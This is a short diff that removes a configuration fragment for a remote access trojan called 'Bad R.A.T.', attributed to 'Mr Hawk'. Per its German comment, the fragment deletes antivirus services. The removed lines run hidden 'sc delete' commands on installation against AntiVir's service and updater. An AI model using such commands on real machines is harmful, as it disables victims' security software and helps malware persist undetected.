@@ -1,7 +1,0 @@
-;Event Setting [Bad R.A.T.]
-;by Mr Hawk
-
-;löscht die AVs, die sich als Services angemeldt haben
-;AntiVir
-OnInstallation: StartPath_Hide sc delete AntiVir Service
-OnInstallation: StartPath_Hide sc delete AntiVir Update
